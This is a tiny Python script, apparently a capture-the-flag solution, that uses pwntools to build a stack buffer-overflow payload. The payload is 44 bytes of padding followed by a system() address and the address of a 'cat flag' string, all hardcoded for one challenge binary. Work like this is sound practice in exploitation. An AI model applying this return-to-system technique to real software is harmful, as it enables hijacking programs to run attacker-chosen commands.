import pwn

junk = "A"*44
cat_flag = pwn.p32(0x0804a030) # flag string 
system = pwn.p32(0x8048657)

print junk  + system + cat_flag
